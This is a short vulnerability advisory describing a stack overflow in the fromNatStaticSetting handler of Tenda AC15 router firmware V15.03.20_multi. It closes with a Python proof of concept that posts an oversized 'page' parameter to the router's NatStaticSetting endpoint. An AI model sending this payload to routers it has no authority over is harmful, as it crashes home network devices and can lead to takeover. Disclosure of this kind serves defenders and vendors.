## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `fromNatStaticSetting` function. The `v6` variable receives the `page` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `v6` can trigger this security vulnerability.

![image-20240314154329835](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314154329835.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/NatStaticSetting"
payload = b"a"*2000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314154349362](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314154349362.png)
